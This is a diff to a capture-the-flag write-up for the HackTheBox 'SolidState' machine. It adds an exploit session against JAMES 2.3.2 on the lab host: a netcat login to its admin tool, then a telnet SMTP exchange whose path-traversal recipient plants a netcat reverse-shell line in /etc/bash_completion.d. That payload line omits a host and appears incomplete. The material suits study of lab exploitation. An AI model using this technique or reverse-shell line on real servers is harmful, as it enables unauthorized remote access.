@@ -202,6 +202,7 @@ mindy@solidstate:~$ cat /etc/passwd
   - Read here: https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html#intended-path
   - Add User: `hardyboy`
 ```CSS
+▶  nc 10.10.10.51 4555
 JAMES Remote Administration Tool 2.3.2
 Please enter your login and password
 Login id:
@@ -216,7 +217,30 @@ Bye
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236778269-50d42f3d-ffb2-46c0-9cf9-3646cb038f16.png)
 
-  - Send the new user an email with a reverse shell, connecting to SMTP on 25 which will create a file `/etc/bash_completion.d` which contains a reverse shell.
+  - Send the new user an email using `telnet` with a reverse shell, connecting to SMTP on 25 which will create a file `/etc/bash_completion.d` which contains a reverse shell.
 ```CSS
-
+▶ telnet 10.10.10.51 25
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
+EHLO hardyboy
+220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 8 May 2023 05:17:38 -0400 (EDT)
+250-solidstate Hello hardyboy (10.10.14.24 [10.10.14.24])
+250-PIPELINING
+250 ENHANCEDSTATUSCODES
+MAIL FROM: <'hardyboy@10.10.14.24>
+250 2.1.0 Sender <'hardyboy@10.10.14.24> OK
+RCPT TO: <../../../../../../../../etc/bash_completion.d>
+250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
+DATA
+354 Ok Send data ending with <CRLF>.<CRLF>
+FROM: hardyboy@10.10.14.24
+'
+/bin/nc -e /bin/bash 443
+.
+250 2.6.0 Message received
+quit
+221 2.0.0 solidstate Service closing transmission channel
+Connection closed by foreign host.
 ```
+![image](https://user-images.githubusercontent.com/83878909/236787308-8cf8a5eb-a280-47b4-ad74-b1aedb3181ff.png)
